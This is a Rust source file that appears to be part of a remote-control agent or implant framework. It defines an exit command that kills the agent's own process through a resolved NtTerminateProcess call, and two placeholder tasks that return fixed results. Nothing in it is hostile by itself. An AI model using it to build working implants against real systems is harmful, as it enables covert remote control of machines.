use libc_print::libc_println;
use mod_agentcore::instance;
use rs2_communication_protocol::{
    communication_structs::task_output::TaskOutput, metadata::Metadata,
};

/// Asynchronously terminates the current process based on the provided exit type.
///
/// # Arguments
///
/// * `exit_type` - An integer that specifies the type of exit. If `exit_type` is 1,
///   the function attempts to terminate the current process.
///
/// # Safety
///
/// This function performs unsafe operations, including terminating the process, which
/// can lead to data loss or corruption if not handled properly.
///
/// # Async Behavior
///
/// The function is async to potentially allow for pre-termination asynchronous operations,
/// but the actual process termination is a blocking operation.
pub async fn exit_command(exit_type: i32) {
    // Example of an asynchronous operation before termination
    if exit_type == 1 {
        // The actual process termination remains a synchronous operation
        unsafe {
            let ntstatus = instance().ntdll.nt_terminate_process.run(-1isize as _, 0);

            // Check if the termination was successful
            if ntstatus < 0 {
                // Print an error message if the termination failed
                libc_println!("NtTerminateProcess failed: {:#X}", ntstatus);
            }
        }
    }
}

// Simulated asynchronous task that takes 2 seconds to complete.
pub async fn task_type_a(metadata: Metadata) -> TaskOutput {
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await; // Simulate some work
    let mut output = TaskOutput::new();
    output.with_metadata(metadata);
    output.output = Some("Result from task type A".to_string());
    output
}

// Simulated asynchronous task that takes 3 seconds to complete.
pub async fn task_type_b(metadata: Metadata) -> TaskOutput {
    tokio::time::sleep(tokio::time::Duration::from_secs(3)).await; // Simulate longer work
    let mut output = TaskOutput::new();
    output.with_metadata(metadata);
    output.output = Some("Result from task type B".to_string());
    output
}